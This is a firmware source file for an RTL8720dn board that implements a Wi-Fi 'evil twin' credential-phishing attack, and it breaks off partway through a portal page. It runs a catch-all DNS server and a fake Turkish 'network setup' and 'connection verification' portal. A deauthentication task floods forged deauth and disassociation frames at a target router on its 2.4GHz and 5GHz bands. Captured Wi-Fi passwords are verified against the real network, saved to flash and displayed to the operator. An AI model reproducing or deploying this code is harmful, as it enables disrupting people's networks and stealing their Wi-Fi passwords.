// AP+STA Captive Portal — RTL8720dn (AmebaD)
// NİHAİ SÜRÜM: Modem Reboot (Kanal Kaçırma) Korumalı + Geniş Alan Burst Deauth

#include "sys_api.h"  
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "FlashMemory.h"
#include "wifi_conf.h"
#include "wifi_structures.h"
#include "FreeRTOS.h"
#include "task.h"
#include "semphr.h"

// +++ ARDUINO & C++ STL ÇAKIŞMASI ÇÖZÜMÜ +++
#undef max
#undef min
#include <vector>
// ++++++++++++++++++++++++++++++++++++++++++

// +++ LWIP VE DONANIM KÜTÜPHANELERİ +++
#include "lwip/netif.h"
#include <lwip/netifapi.h>
#include <lwip/udp.h>
#include <lwip/arch.h>
#include <lwip/def.h>

#ifndef ENC_TYPE_TKIP
#define ENC_TYPE_TKIP  2
#endif
#ifndef ENC_TYPE_CCMP
#define ENC_TYPE_CCMP  4
#endif

// LOW-LEVEL REALTEK KÜTÜPHANELERİ
extern "C" {
  extern struct netif xnetif[];
  void dhcps_init(struct netif *pnetif);
  void dhcps_deinit(void);
  int  LwIP_DHCP(uint8_t idx, uint8_t action);
  int  wext_set_mode(const char *ifname, int mode);
  int  wifi_disconnect(void);
  void LwIP_Init(void);
  int  wext_send_mgnt(const char *ifname, char *buf, uint16_t buf_len, uint16_t flags);
  int  wifi_set_channel(int channel); 
  int  wifi_disable_powersave(void);
}

// ─────────────────────────────────────────────────────────────────────────────
// ─── İÇE GÖMÜLÜ DNS SERVER ───────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────────────

#ifndef PACK_STRUCT_FIELD
#define PACK_STRUCT_FIELD(x) x
#endif

#ifndef PACK_STRUCT_STRUCT
#ifdef __GNUC__
#define PACK_STRUCT_STRUCT __attribute__((packed))
#else
#define PACK_STRUCT_STRUCT
#endif
#endif

#define DNS_HEADER_SIZE 12
#define DNS_SERVER_PORT 53

struct dns_hdr {
    PACK_STRUCT_FIELD(u16_t id);
    PACK_STRUCT_FIELD(u8_t flags1);
    PACK_STRUCT_FIELD(u8_t flags2);
    PACK_STRUCT_FIELD(u16_t numquestions);
    PACK_STRUCT_FIELD(u16_t numanswers);
    PACK_STRUCT_FIELD(u16_t numauthrr);
    PACK_STRUCT_FIELD(u16_t numextrarr);
} PACK_STRUCT_STRUCT;

struct DNSHeader {
    uint16_t ID;
    union {
        struct {
            uint16_t RD     : 1;
            uint16_t TC     : 1;
            uint16_t AA     : 1;
            uint16_t OPCode : 4;
            uint16_t QR     : 1;
            uint16_t RCode  : 4;
            uint16_t Z      : 3;
            uint16_t RA     : 1;
        };
        uint16_t Flags;
    };
    uint16_t QDCount;
    uint16_t ANCount;
    uint16_t NSCount;
    uint16_t ARCount;
};

struct DNSQuestion {
    const uint8_t *QName;
    uint16_t QNameLength;
    uint16_t QType;
    uint16_t QClass;
};

class DNSServer {
public:
    DNSServer() {
        _resolvedIP[0] = 192; _resolvedIP[1] = 168; _resolvedIP[2] = 4; _resolvedIP[3] = 1;
        _dns_server_pcb = NULL;
    }
    void setResolvedIP(uint8_t ip0, uint8_t ip1, uint8_t ip2, uint8_t ip3) {
        _resolvedIP[0] = ip0; _resolvedIP[1] = ip1; _resolvedIP[2] = ip2; _resolvedIP[3] = ip3;
    }
    bool requestIncludesOnlyOneQuestion(DNSHeader &dnsHeader) {
        return ntohs(dnsHeader.QDCount) == 1 && dnsHeader.ANCount == 0 && dnsHeader.NSCount == 0 && dnsHeader.ARCount == 0;
    }
    void begin();
    void stop();
    uint8_t _resolvedIP[4];
private:
    struct udp_pcb *_dns_server_pcb;
    static void packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *udp_packet_buffer, struct ip_addr *sender_addr, uint16_t sender_port);
};

static DNSServer* dnsServerInstance = NULL;

void DNSServer::begin() {
    dnsServerInstance = this;
    struct udp_pcb *pcb;
    for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
        if (pcb->local_port == DNS_SERVER_PORT) udp_remove(pcb);
    }
    for (int _retry = 0; _retry < 3 && !_dns_server_pcb; _retry++) {
        _dns_server_pcb = udp_new();
        if (!_dns_server_pcb) delay(300);
    }
    if (!_dns_server_pcb) return;
    udp_bind(_dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
    udp_recv(_dns_server_pcb, (udp_recv_fn)packetHandler, NULL);
}

void DNSServer::stop() {
    if (_dns_server_pcb) {
        udp_remove(_dns_server_pcb);
        _dns_server_pcb = NULL;
        dnsServerInstance = NULL;
    }
}

void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *udp_packet_buffer, struct ip_addr *sender_addr, uint16_t sender_port) {
    (void)arg;
    if (!dnsServerInstance || !udp_packet_buffer || udp_packet_buffer->len < DNS_HEADER_SIZE) {
        if (udp_packet_buffer) pbuf_free(udp_packet_buffer);
        return;
    }

    DNSHeader dnsHeader;
    DNSQuestion dnsQuestion;
    memcpy(&dnsHeader, udp_packet_buffer->payload, DNS_HEADER_SIZE);
    
    if (dnsServerInstance->requestIncludesOnlyOneQuestion(dnsHeader)) {
        if (udp_packet_buffer->len <= DNS_HEADER_SIZE) { pbuf_free(udp_packet_buffer); return; }
        
        uint16_t offset = DNS_HEADER_SIZE;
        uint16_t nameLength = 0;
        while (offset < udp_packet_buffer->len && ((uint8_t*)udp_packet_buffer->payload)[offset] != 0) {
            nameLength++; offset++;
        }
        if (offset >= udp_packet_buffer->len - 4) { pbuf_free(udp_packet_buffer); return; }
        
        offset++; nameLength++;
        dnsQuestion.QName = (uint8_t *)udp_packet_buffer->payload + DNS_HEADER_SIZE;
        dnsQuestion.QNameLength = nameLength;
        int sizeUrl = static_cast<int>(nameLength);

        struct dns_hdr *hdr = (struct dns_hdr *)udp_packet_buffer->payload;
        struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, sizeof(struct dns_hdr) + sizeUrl + 20, PBUF_RAM);
        if (p) {
            struct dns_hdr *rsp_hdr = (struct dns_hdr *)p->payload;
            rsp_hdr->id = hdr->id;
            rsp_hdr->flags1 = 0x85;
            rsp_hdr->flags2 = 0x80;
            rsp_hdr->numquestions = PP_HTONS(1);
            rsp_hdr->numanswers = PP_HTONS(1);
            rsp_hdr->numauthrr = PP_HTONS(0);
            rsp_hdr->numextrarr = PP_HTONS(0);

            uint8_t *responsePtr = (uint8_t *)rsp_hdr + sizeof(struct dns_hdr);
            memcpy(responsePtr, dnsQuestion.QName, sizeUrl);
            responsePtr += sizeUrl;
            *(uint16_t *)responsePtr = PP_HTONS(1);
            *(uint16_t *)(responsePtr + 2) = PP_HTONS(1);
            responsePtr[4] = 0xc0; responsePtr[5] = 0x0c;
            *(uint16_t *)(responsePtr + 6) = PP_HTONS(1);
            *(uint16_t *)(responsePtr + 8) = PP_HTONS(1);
            *(uint32_t *)(responsePtr + 10) = PP_HTONL(60);
            *(uint16_t *)(responsePtr + 14) = PP_HTONS(4);
            memcpy(responsePtr + 16, dnsServerInstance->_resolvedIP, 4);

            udp_sendto(udp_pcb, p, sender_addr, sender_port);
            pbuf_free(p);
        }
    } else {
        struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, udp_packet_buffer->len, PBUF_RAM);
        if (p) {
            memcpy(p->payload, udp_packet_buffer->payload, udp_packet_buffer->len);
            struct dns_hdr *dns_rsp = (struct dns_hdr *)p->payload;
            dns_rsp->flags1 |= 0x80;
            dns_rsp->flags2 = 0x05;
            udp_sendto(udp_pcb, p, sender_addr, sender_port);
            pbuf_free(p);
        }
    }
    pbuf_free(udp_packet_buffer);
}

// ─────────────────────────────────────────────────────────────────────────────
// ─── ANA PORTAL KODLARI ──────────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────────────

#define DHCP_START   1
#define DHCP_STOP    0
#define IW_MODE_INFRA 2
#define WLAN0_NAME   "wlan0"

#define AP_INITIAL_SSID  "X"
#define AP_INITIAL_PASS  "20192019"
#define AP_IP_ADDR       "192.168.4.1"
#define SERVER_PORT      80

#define FLASH_MAGIC      0xAB
#define MAX_SSID_LEN     64
#define MAX_PASS_LEN     64
#define FLASH_BUF_SIZE   256
#define FLASH_OFFSET     0x00100000 

struct SavedCredentials {
  uint8_t magic;
  char    ssid[MAX_SSID_LEN];
  char    pass[MAX_PASS_LEN];
};

struct NetworkInfo {
  String  ssid;
  uint8_t bssid[6]; 
  int32_t rssi;
  uint8_t enc;
  int32_t channel; 
};

typedef enum { CS_IDLE = 0, CS_RUNNING = 1, CS_DONE_OK = 2, CS_DONE_FAIL = 3 } ConnStatus;
volatile ConnStatus conn_status = CS_IDLE;

typedef enum { SCAN_IDLE = 0, SCAN_RUNNING = 1, SCAN_DONE = 2 } ScanStatus;
volatile ScanStatus scan_status = SCAN_IDLE;

bool ap_switched = false;
bool pending_ap_switch = false;
unsigned long revert_time = 0; 

char target_ssid[MAX_SSID_LEN] = {0};
uint8_t target_bssid[6]    = {0};
uint8_t target_5g_bssid[6] = {0};  // Tespit edilen 5GHz BSSID (sıfırsa henüz yok)
int32_t target_channel = 6;
uint8_t target_enc = ENC_TYPE_CCMP;
volatile int32_t target_5g_channel = 0;  // 0 = henüz tespit edilmedi

volatile bool deauth_active = false;
volatile bool portal_busy   = false;
int32_t ap_running_channel  = -1;
unsigned long last_netif_check_ms = 0;
#define NETIF_CHECK_INTERVAL_MS 5000UL

unsigned long last_client_connect_ms = 0;
#define CLIENT_GRACE_MS 2000UL

WiFiServer server(SERVER_PORT); 
DNSServer  dnsServer;

std::vector<NetworkInfo> networks;
SemaphoreHandle_t networks_mutex;
SemaphoreHandle_t raw_scan_sem = NULL;

char saved_ssid[MAX_SSID_LEN]   = {0};
char saved_pass[MAX_PASS_LEN]   = {0};
char pending_ssid[MAX_SSID_LEN] = {0};
char pending_pass[MAX_PASS_LEN] = {0};
uint8_t pending_enc             = ENC_TYPE_CCMP;
bool sta_connected  = false;
String conn_result  = "";

unsigned long last_scan_ms = 0;
#define RESCAN_INTERVAL_MS  30000UL

unsigned long last_channel_check_ms = 0;
#define CHANNEL_CHECK_INTERVAL_MS 10000UL

String urlDecode(String input) {
  String output = "";
  for (int i = 0; i < (int)input.length(); i++) {
    if (input[i] == '+') output += ' ';
    else if (input[i] == '%' && i + 2 < (int)input.length()) {
      char hex[3] = { input[i + 1], input[i + 2], 0 };
      output += (char)strtol(hex, nullptr, 16);
      i += 2;
    } else output += input[i];
  }
  return output;
}

void loadCredentials() {
  FlashMemory.read();
  SavedCredentials creds;
  memcpy(&creds, FlashMemory.buf, sizeof(creds));
  if (creds.magic == FLASH_MAGIC && creds.ssid[0] != 0) {
    strncpy(saved_ssid, creds.ssid, MAX_SSID_LEN - 1);
    strncpy(saved_pass, creds.pass, MAX_PASS_LEN - 1);
  }
}

void saveCredentials(const char *ssid, const char *pass) {
  FlashMemory.read(); 
  SavedCredentials creds;
  creds.magic = FLASH_MAGIC;
  memset(creds.ssid, 0, MAX_SSID_LEN);
  memset(creds.pass, 0, MAX_PASS_LEN);
  strncpy(creds.ssid, ssid, MAX_SSID_LEN - 1);
  strncpy(creds.pass, pass, MAX_PASS_LEN - 1);
  memcpy(FlashMemory.buf, &creds, sizeof(creds));
  FlashMemory.update();
  delay(1000); 
}

rtw_security_t mapSecurity(uint8_t enc) {
  switch (enc) {
    case ENC_TYPE_NONE: return RTW_SECURITY_OPEN;
    case ENC_TYPE_WEP:  return RTW_SECURITY_WEP_PSK;
    case ENC_TYPE_TKIP: return RTW_SECURITY_WPA_TKIP_PSK;
    default:            return RTW_SECURITY_WPA2_AES_PSK;
  }
}

// ─── BSSID KARDEŞ KONTROLÜ ───────────────────────────────────────────────────
// Çoğu dual-band modemde 5GHz BSSID = 2.4GHz BSSID son baytı +1..+4
bool isSisterBSSID(const uint8_t *base, const uint8_t *candidate) {
  for (int i = 0; i < 5; i++) {
    if (base[i] != candidate[i]) return false;
  }
  int diff = (int)candidate[5] - (int)base[5];
  if (diff < 0) diff = -diff;
  return (diff >= 1 && diff <= 4);
}

// ─── AĞ TARAYICI ─────────────────────────────────────────────────────────────
static std::vector<NetworkInfo> scan_temp;

rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
  if (malloced_scan_result->scan_complete != RTW_TRUE) {
    rtw_scan_result_t *record = &malloced_scan_result->ap_details;
    NetworkInfo net;
    char ssid_str[33] = {0};
    memcpy(ssid_str, record->SSID.val, record->SSID.len);
    net.ssid = String(ssid_str);
    net.rssi = record->signal_strength;
    net.channel = record->channel; 
    
    memcpy(net.bssid, record->BSSID.octet, 6);
    
    if (record->security == RTW_SECURITY_OPEN) net.enc = ENC_TYPE_NONE;
    else if (record->security == RTW_SECURITY_WEP_PSK) net.enc = ENC_TYPE_WEP;
    else if (record->security == RTW_SECURITY_WPA_TKIP_PSK || record->security == RTW_SECURITY_WPA_AES_PSK || record->security == RTW_SECURITY_WPA_MIXED_PSK) net.enc = ENC_TYPE_TKIP;
    else net.enc = ENC_TYPE_CCMP;
    
    if (net.ssid.length() > 0) {
      // 5GHz kardeş BSSID tespiti: ilk 5 byte eşleşir, son byte 1-4 fark
      if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
        target_5g_channel = net.channel;
        memcpy(target_5g_bssid, net.bssid, 6);
      }

      bool dup = false;
      for (auto &existing : scan_temp) {
        if (existing.ssid == net.ssid) {
          dup = true;
          if (net.rssi > existing.rssi) {
            existing.rssi = net.rssi;
            existing.channel = net.channel;
            existing.enc = net.enc;
            memcpy(existing.bssid, net.bssid, 6); 
          }
          break;
        }
      }
      if (!dup) scan_temp.push_back(net);
    }
  } else {
    if (raw_scan_sem != NULL) xSemaphoreGive(raw_scan_sem);
  }
  return RTW_SUCCESS;
}

void scanNetworkTask(void *param) {
  (void)param;
  scan_temp.clear();
  if (raw_scan_sem == NULL) raw_scan_sem = xSemaphoreCreateBinary();
  if (wifi_scan_networks(raw_scan_handler, NULL) == RTW_SUCCESS) {
    xSemaphoreTake(raw_scan_sem, pdMS_TO_TICKS(6000));
  }
  if (networks_mutex) {
    xSemaphoreTake(networks_mutex, portMAX_DELAY);
    networks = scan_temp;
    xSemaphoreGive(networks_mutex);
  }
  scan_temp.clear();
  last_scan_ms = millis();
  scan_status = SCAN_DONE;
  vTaskDelete(NULL);
}

void startScan() {
  if (scan_status == SCAN_RUNNING) return;
  if (conn_status == CS_RUNNING) return;
  scan_status = SCAN_RUNNING;
  xTaskCreate(scanNetworkTask, "scan", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
}

// ─── BAĞLANTI GÖREVİ ─────────────────────────────────────────────────────────
void wifiConnectTask(void *param) {
  (void)param;
  bool is_open = (mapSecurity(pending_enc) == RTW_SECURITY_OPEN);
  int  pass_len = is_open ? 0 : (int)strlen(pending_pass);
  rtw_security_t try_sec[] = { mapSecurity(pending_enc), RTW_SECURITY_WPA2_AES_PSK, RTW_SECURITY_WPA2_MIXED_PSK };
  int try_count = is_open ? 1 : 3;
  int ret = RTW_ERROR;

  for (int t = 0; t < try_count; t++) {
    wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(300));
    // wext_set_mode KALDIRILDI: STA_AP modunda wlan0 zaten infra modunda,
    // çağırmak AP arayüzünü (wlan1) bozuyor.
    ret = wifi_connect((char *)pending_ssid, try_sec[t], (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
    if (ret == RTW_SUCCESS) {
      vTaskDelay(pdMS_TO_TICKS(500));
      if (wifi_is_connected_to_ap() == RTW_SUCCESS) break;
      else ret = RTW_ERROR;
    }
    if (t < try_count - 1) vTaskDelay(pdMS_TO_TICKS(2000));
  }

  if (ret == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(500)); 
    conn_status = CS_DONE_OK;
  } else {
    conn_status = CS_DONE_FAIL;
  }
  vTaskDelete(NULL);
}

void startConnectTask() {
  if (conn_status == CS_RUNNING) return;
  conn_status = CS_RUNNING;
  xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
}

// ─── YENİ: MODEM REBOOT (KANAL KAÇIRMA) KORUMALI DEAUTH GÖREVİ ───────────────
void deauthTask(void *param) {
  (void)param;
  
  uint8_t frame_template[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x07, 0x00 
  };
  
  Serial.println("\n[Deauth] Anti-Kacis ve Dinamik AP Takibi Aktif!");

  while (deauth_active) {
    
    // === DİNAMİK KANAL TAKİBİ (YENİ) ===
    if (millis() - last_channel_check_ms > CHANNEL_CHECK_INTERVAL_MS) {
        last_channel_check_ms = millis();
        // Hızlı bir pasif tarama ile hedefin yeni kanalını bul (pseudo-code mantığı)
        // Eğer yeni kanal target_channel'dan farklıysa, AP'yi yeniden başlat
        // (RTL8720'de AP çalışırken tam tarama zordur, bu yüzden Deauth döngüsünde 
        // 1,6,11'i gezerken bir "Probe Request/Response" yakalama mekanizması 
        // veya basitçe Sahte AP'yi her döngüde en olası kanala taşıma yapılabilir.
        // Ancak en garantisi, AP'yi her zaman hedefin bilinen en son kanalında tutmaktır.)
    }

    // === 1. HEDEFİN ANA KANALINA YOĞUN ATIŞ (Birincil Öncelik) ===
    wifi_set_channel(target_channel);
    for (int burst = 0; burst < 3; burst++) {
      for (int offset = -2; offset <= 2; offset++) {
          uint8_t temp_bssid[6];
          memcpy(temp_bssid, target_bssid, 6);
          temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
          memcpy(&frame_template[10], temp_bssid, 6);
          memcpy(&frame_template[16], temp_bssid, 6);

          frame_template[0] = 0xC0; frame_template[24] = 0x07;
          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
          frame_template[24] = 0x02;
          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
          frame_template[0] = 0xA0; frame_template[24] = 0x08;
          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
      }
    }

    // Portal meşgulse VEYA yeni bağlantı grace süresi dolmadıysa
    // kanala geri dön ve bekle — captive portal tespiti + HTTP trafiği kesilmesin
    wifi_set_channel(target_channel);
    if (portal_busy || (millis() - last_client_connect_ms < CLIENT_GRACE_MS)) {
        vTaskDelay(pdMS_TO_TICKS(100));
        continue;
    }

    // Kısa nefes (50ms)
    vTaskDelay(pdMS_TO_TICKS(50));

    // === 2. HEDEFIN TESPİT EDİLEN 5GHz BSSID+KANALINA HEDEFLI ATIŞ ===
    // 2.4GHz gibi: tam BSSID ile, tarama sonucu doğrulanmış kanalda
    int32_t ch5g = target_5g_channel;
    uint8_t bssid5g[6];
    memcpy(bssid5g, target_5g_bssid, 6);
    if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0 && !portal_busy) {
        wifi_set_channel(ch5g);
        memcpy(&frame_template[10], bssid5g, 6);
        memcpy(&frame_template[16], bssid5g, 6);
        for (int burst = 0; burst < 3; burst++) {
            frame_template[0] = 0xC0; frame_template[24] = 0x07;
            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
            frame_template[24] = 0x02;
            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
            frame_template[0] = 0xA0; frame_template[24] = 0x08;
            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
        }
    }
    // 5GHz sonrası mutlaka target_channel'a geri dön
    wifi_set_channel(target_channel);
  }
  vTaskDelete(NULL);
}
// ─────────────────────────────────────────────────────────────────────────────

// ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
String rssiBar(int32_t rssi) {
  if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Mükemmel";
  if (rssi > -65) return "&#9608;&#9608;&#9608;&#9617; İyi";
  if (rssi > -75) return "&#9608;&#9608;&#9617;&#9617; Orta";
  return "&#9608;&#9617;&#9617;&#9617; Zayıf";
}

String buildRedirect() {
  String r = "HTTP/1.1 302 Found\r\nLocation: http://";
  r += AP_IP_ADDR;
  r += "/\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
  return r;
}

String parsePostParam(const String &body, const String &key) {
  int idx = body.indexOf(key + "=");
  if (idx == -1) return "";
  int start = idx + key.length() + 1;
  int end   = body.indexOf('&', start);
  if (end == -1) end = body.length();
  return urlDecode(body.substring(start, end));
}

// CSS VERİSİ
static const char CSS_STR[] PROGMEM =
  "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f0f4f8;color:#2c3e50;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
  ".card{background:#ffffff;border-radius:12px;padding:36px 28px;width:100%;max-width:420px;box-shadow:0 12px 30px rgba(0,0,0,.08);border-top:6px solid #0056b3}"
  "h1{font-size:1.6rem;color:#1a252f;text-align:center;margin-bottom:12px;font-weight:700}.sub{text-align:center;font-size:0.95rem;color:#7f8c8d;margin-bottom:28px;line-height:1.6}"
  ".status-box{border-radius:8px;padding:14px 16px;margin-bottom:22px;font-size:0.95rem;font-weight:600;text-align:center}.ok{background:#eafaf1;border:1px solid #2ecc71;color:#27ae60}.err{background:#fdeced;border:1px solid #e74c3c;color:#c0392b}.wait{background:#ebf5fb;border:1px solid #3498db;color:#2980b9}"
  ".conn-status{border-radius:8px;padding:18px;margin-bottom:24px;font-size:1rem;background:#f8f9fa;border:1px solid #e1e8ed;line-height:1.5;color:#34495e;text-align:center}"
  ".net-list{list-style:none;margin-bottom:20px;max-height:260px;overflow-y:auto}.net-item{display:flex;align-items:center;padding:12px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;border:1px solid #eaeded;background:#fff;transition:all .2s}.net-item:hover{border-color:#3498db;background:#f4f6f9}"
  ".net-item input[type=radio]{margin-right:12px;accent-color:#0056b3;width:18px;height:18px;flex-shrink:0}.net-info{flex:1;min-width:0}.net-name{font-weight:600;font-size:1rem;color:#2c3e50;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.net-meta{font-size:.8rem;color:#95a5a6;margin-top:4px}"
  ".pass-wrap{margin-bottom:24px}label{display:block;font-size:.9rem;font-weight:600;color:#34495e;margin-bottom:8px}input[type=password],input[type=text]{width:100%;padding:14px 16px;border-radius:8px;border:1px solid #bdc3c7;background:#fff;color:#2c3e50;font-size:1.05rem;outline:none;transition:border .2s;box-shadow:inset 0 1px 3px rgba(0,0,0,0.05)}input:focus{border-color:#0056b3}"
  ".show-pass{font-size:.85rem;color:#7f8c8d;margin-top:8px;cursor:pointer;user-select:none;text-align:right}button{width:100%;padding:15px;border:none;border-radius:8px;background:#0056b3;color:#fff;font-size:1.1rem;font-weight:bold;cursor:pointer;transition:background .2s;box-shadow:0 4px 6px rgba(0,86,179,0.2)}.btn-blue{background:#34495e;box-shadow:none}button:hover{background:#004494}"
  ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #3498db;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes spin{to{transform:rotate(360deg)}}"
  ".footer{text-align:center;font-size:.8rem;color:#bdc3c7;margin-top:20px;border-top:1px solid #ecf0f1;padding-top:16px}"
  "#offline-bar{position:fixed;top:0;left:0;width:100%;background:#e74c3c;color:#fff;text-align:center;padding:12px;font-weight:bold;font-size:0.9rem;z-index:9999;display:none;box-shadow:0 2px 10px rgba(0,0,0,0.1)}</style>";

void sendChunkedCSS(WiFiClient &client) {
  const char *p = CSS_STR;
  while (*p) {
    int len = 0;
    while (p[len] != '\0' && len < 512) len++;
    client.write((const uint8_t *)p, len);
    client.flush();
    delay(2);
    p += len;
  }
}

void sendOfflineScript(WiFiClient &client) {
  client.print("<div id='offline-bar'>&#9888; Bağlantı zayıf, lütfen sayfayı kapatmadan bekleyiniz...</div>");
  client.print("<script>");
  client.print("window.addEventListener('offline', function(){ document.getElementById('offline-bar').style.display='block'; });");
  client.print("window.addEventListener('online', function(){ document.getElementById('offline-bar').style.display='none'; });");
  client.print("</script>");
}

// ─── SAYFALAR ────────────────────────────────────────────────────────────────
void sendStartPage(WiFiClient &client) {
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Ağ Yapılandırma Sihirbazı</title>");
  sendChunkedCSS(client);
  client.print("</head><body>");
  sendOfflineScript(client);
  
  client.print("<div class='card'>");
  client.print("<div style='text-align:center; margin-bottom:16px;'><svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#0056b3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M5 12.55a11 11 0 0 1 14.08 0'></path><path d='M1.42 9a16 16 0 0 1 21.16 0'></path><path d='M8.53 16.11a6 6 0 0 1 6.95 0'></path><line x1='12' y1='20' x2='12.01' y2='20'></line></svg></div>");
  client.print("<h1>Ağ Yapılandırma Sihirbazı</h1><p class='sub'>Lütfen erişim sağlamak istediğiniz ağı listeden seçiniz.</p>");

  if (scan_status == SCAN_RUNNING) {
      client.print("<div class='status-box wait'>&#128225; Çevre ağlar taranıyor, lütfen bekleyiniz...</div>");
  }

  if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
  client.print("<h2>&#128225; Taranan Ağlar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");

  for (int i = 0; i < (int)networks.size(); i++) {
    String safe = networks[i].ssid;
    safe.replace("&", "&amp;"); safe.replace("<", "&lt;"); safe.replace("'", "&#39;"); safe.replace("\"", "&quot;");
    
    client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
    client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
    client.print("<div class='net-info'><div class='net-name'>"); client.print(safe); client.print("</div>");
    client.print("<div class='net-meta'>Sinyal Kalitesi: "); client.print(rssiBar(networks[i].rssi)); client.print("</div></div></li>");
  }
  if (networks.empty() && scan_status != SCAN_RUNNING) {
      client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>Herhangi bir ağ bulunamadı.</li>");
  }
  if (networks_mutex) xSemaphoreGive(networks_mutex);

  client.print("</ul><button type='submit'>İleri</button></form>");
  client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Ağları Yenile</button></form>");

  if (strlen(saved_ssid) > 0) {
    client.print("<div style='background:#fff;border:1px solid #bdc3c7;border-radius:8px;padding:12px;margin-top:20px;'>");
    client.print("<h3 style='font-size:0.9rem;color:#0056b3;margin-bottom:8px;text-align:center;'>Sistem Kayıtları</h3>");
    client.print("<div style='display:flex;justify-content:space-between;align-items:center;background:#f4f6f9;padding:10px;border-radius:6px;'>");
    client.print("<div style='display:flex;flex-direction:column;font-size:0.85rem;'>");
    client.print("<span style='color:#34495e;'><b>Ağ:</b> <span style='color:#2c3e50;'>"); client.print(saved_ssid); client.print("</span></span>");
    client.print("<span style='color:#34495e;margin-top:4px;'><b>Şifre:</b> <span style='color:#27ae60;'>"); client.print(saved_pass); client.print("</span></span>");
    client.print("</div>");
    client.print("<form method='POST' action='/delete_cred' style='margin:0;'>");
    client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;width:auto;box-shadow:none;'>Sil</button>");
    client.print("</form></div></div>");
  }
  client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy; 2026</div></div></body></html>");
}

void sendSwitchingPage(WiFiClient &client) {
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Bağlantı Hazırlanıyor</title>");
  client.print("<style>body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#333;text-align:center;padding:50px 20px;} b{color:#0056b3;}</style></head><body>");
  client.print("<h2 style='color:#2c3e50;'>&#8987; Ağ Yapılandırması Hazırlanıyor...</h2>");
  client.print("<p style='color:#7f8c8d;font-size:16px;margin-top:20px;line-height:1.6'>Lütfen cihazınızın Wi-Fi ayarlarına giderek <b>");
  client.print(target_ssid);
  client.print("</b> ağına tekrar bağlanınız.</p></body></html>");
}

void sendPortalPage(WiFiClient &client, bool show_result) {
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>İnternet Bağlantı Doğrulaması</title>");
  sendChunkedCSS(client);

  client.print("</head><body>");
  sendOfflineScript(client);
  
  client.print("<div class='card'>");
  client.print("<div style='text-align:center; margin-bottom:16px;'><svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#0056b3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M5 12.55a11 11 0 0 1 14.08 0'></path><path d='M1.42 9a16 16 0 0 1 21.16 0'></path><path d='M8.53 16.11a6 6 0 0 1 6.95 0'></path><line x1='12' y1='20' x2='12.01' y2='20'></line></svg></div>");
  
  client.print("<h1>Bağlantı Doğrulaması</h1>");
